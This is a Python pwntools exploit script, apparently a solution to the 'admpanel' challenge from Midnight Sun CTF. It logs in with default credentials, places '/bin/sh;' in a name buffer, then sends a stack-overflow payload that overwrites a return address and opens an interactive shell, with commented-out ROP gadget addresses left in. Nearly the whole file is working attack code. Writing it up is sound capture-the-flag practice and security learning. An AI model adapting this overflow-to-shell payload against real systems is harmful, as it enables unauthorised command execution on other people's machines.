from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./admpanel"

#"""
HOST = "admpanel-01.play.midnightsunctf.se"
PORT = 31337 
"""
HOST = "localhost"
PORT = 7777 
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = 0x4015ca
plt_system = elf.plt["system"]
#libc = ELF('./')
#
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

addr_name = 0x4040e0
addr_testprint = 0x401609
rdi_ret = 0x4016cb
only_ret = 0x401016

def exploit():
	conn.sendlineafter("> ", "1")
	conn.sendlineafter("name: ", "admin")
	conn.sendlineafter("word: ", "password")
	
	#fake_stack = p64(0)
	#fake_stack += p64(only_ret)
	#fake_stack += p64(rdi_ret)
	#fake_stack += p64(addr_name+0x28)
	#fake_stack += p64(plt_system)
	#fake_stack += "/bin/sh\x00"
	fake_stack = "/bin/sh;"	
	fake_stack += "A"*(0x380-len(fake_stack))
	conn.sendlineafter("> ", "1")
	conn.sendlineafter("name: ", fake_stack)

	payload = "B"*(0x100)
	payload += "b"*0x82
	payload += "C"*8
	payload += p64(0x401591)
	#payload += "D"*(0x100)
	#payload += p64(addr_name)

	conn.sendlineafter("> ", "2")
	conn.sendlineafter("cute: ", payload)

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
